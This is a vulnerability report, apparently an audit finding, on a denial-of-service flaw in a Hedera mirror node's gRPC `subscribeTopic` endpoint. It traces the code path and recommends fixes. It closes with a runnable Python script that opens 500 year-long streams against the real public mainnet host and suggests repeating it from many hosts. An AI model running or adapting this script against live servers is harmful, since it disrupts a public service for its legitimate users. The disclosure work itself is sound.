### Title
Unbounded `endTime` in gRPC `subscribeTopic` Enables Connection-Exhaustion DoS

### Summary
`TopicMessageServiceImpl.subscribeTopic()` accepts a client-supplied `endTime` with no upper-bound validation. The `isComplete()` predicate only returns `true` once wall-clock time exceeds `endTime + endTimeInterval` (default 30 s), so a subscriber that sets `endTime` to any future value holds a live gRPC streaming connection open for the full duration. Because there is no global cap on concurrent subscribers and no authentication requirement, an unprivileged attacker can open arbitrarily many long-lived connections and exhaust server resources.

### Finding Description

**Code path**

`ConsensusController.subscribeTopic()` converts the protobuf `consensusEndTime` field directly to a nanosecond long and passes it into `TopicMessageFilter` without any upper-bound check:

```
ConsensusController.toFilter()  →  filter.endTime(endTime)
TopicMessageFilter.isValidEndTime()  →  endTime == null || endTime > startTime   // no ceiling
``` [1](#0-0) [2](#0-1) 

Inside `subscribeTopic()`, the live-message flux is terminated only when `pastEndTime()` completes:

```java
Flux.merge(safetyCheck, live).takeUntilOther(pastEndTime(topicContext))
``` [3](#0-2) 

`pastEndTime()` polls `isComplete()` every `endTimeInterval` (30 s) via a `RepeatSpec`. The Flux only emits its terminal signal (causing `takeUntilOther` to fire) when `isComplete()` returns `true`:

```java
return Flux.empty()
        .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                .withFixedDelay(grpcProperties.getEndTimeInterval()));
``` [4](#0-3) 

`isComplete()` returns `true` only when:

```java
Instant.ofEpochSecond(0, filter.getEndTime())
        .plus(grpcProperties.getEndTimeInterval())
        .isBefore(Instant.now());
// i.e., now > endTime + 30 s
``` [5](#0-4) 

**Root cause**: `TopicMessageFilter` enforces only `endTime > startTime`; there is no maximum future offset. `endTimeInterval` is 30 s by default: [6](#0-5) 

**Exploit flow (specific scenario from the question)**

Setting `endTime = T_subscribe + 30 s + ε`:

| Wall-clock offset | `isComplete()` result | Action |
|---|---|---|
| 0 s | false (`now < endTime + 30 s`) | RepeatSpec waits 30 s |
| 30 s | false | RepeatSpec waits 30 s |
| 60 s | false (strict `isBefore`) | RepeatSpec waits 30 s |
| 90 s | **true** | Flux completes, connection closes |

Each connection lives ~90 s. An attacker opening connections at rate R keeps R × 90 connections open simultaneously. Setting `endTime` to years in the future (e.g., `Long.MAX_VALUE` nanoseconds, which `convertTimestamp` maps to `Long.MAX_VALUE`) makes each connection permanent.

**Why existing checks fail**

- `isValidEndTime()` only rejects `endTime ≤ startTime` — no ceiling. [1](#0-0) 
- `maxConcurrentCallsPerConnection = 5` is a *per-connection* Netty limit, not a global subscriber cap. [7](#0-6) 
- No authentication, no per-IP rate limit, and no global `subscriberCount` ceiling exist in the gRPC service layer. [8](#0-7) 

### Impact Explanation
Each open subscription consumes a gRPC stream slot, a Reactor scheduler thread (via `boundedElastic`), and a database listener registration. With no global subscriber ceiling and no authentication, an attacker can exhaust thread-pool capacity, database connection pool, or Netty channel memory, causing legitimate subscribers to be rejected or the process to crash. Setting `endTime` to `Long.MAX_VALUE` makes every attacker connection permanent until the server is restarted.

### Likelihood Explanation
The gRPC `subscribeTopic` endpoint is publicly accessible with no credentials required. The attack requires only a standard gRPC client (e.g., `grpcurl` or the Hedera SDK), a valid topic ID (trivially enumerable), and the ability to open many TCP connections. It is fully scriptable, repeatable, and requires no special knowledge beyond the public protobuf schema.

### Recommendation
1. **Add an upper-bound constraint on `endTime`** in `TopicMessageFilter` — e.g., reject any `endTime` more than a configurable maximum (e.g., 1 hour) beyond `now`.
2. **Add a global concurrent-subscriber cap** checked in `subscribeTopic()` before incrementing `subscriberCount`, returning `RESOURCE_EXHAUSTED` when the limit is reached.
3. **Add per-IP or per-client rate limiting** at the gRPC interceptor layer to bound the connection-open rate.
4. **Set a server-level `maxConnectionAge`** in Netty/gRPC configuration to forcibly recycle long-lived connections regardless of `endTime`.

### Proof of Concept
```python
import grpc, threading
from hedera.mirror.api.proto import consensus_service_pb2_grpc
from hedera.mirror.api.proto import consensus_service_pb2
from proto.services import basic_types_pb2, timestamp_pb2
import time

GRPC_HOST = "mainnet-public.mirrornode.hedera.com:443"
TOPIC_ID   = basic_types_pb2.TopicID(shardNum=0, realmNum=0, topicNum=1)

def open_connection():
    channel = grpc.secure_channel(GRPC_HOST, grpc.ssl_channel_credentials())
    stub    = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    now     = int(time.time())
    # endTime = now + 30s + 1s  →  connection lives ~90 s
    # endTime = now + 3600*24*365  →  connection lives ~1 year
    end_ts  = timestamp_pb2.Timestamp(seconds=now + 3600 * 24 * 365, nanos=0)
    query   = consensus_service_pb2.ConsensusTopicQuery(
                  topicID=TOPIC_ID,
                  consensusEndTime=end_ts)
    for _ in stub.subscribeTopic(query):   # blocks until server closes
        pass

threads = [threading.Thread(target=open_connection) for _ in range(500)]
for t in threads:
    t.start()
# 500 permanent connections; repeat to grow indefinitely
```

Each thread holds a streaming connection open until `now > endTime + 30 s`. With `endTime` set one year out, 500 threads create 500 permanent connections. Repeating the script from multiple hosts exhausts the server's thread pool and connection capacity with no authentication required.
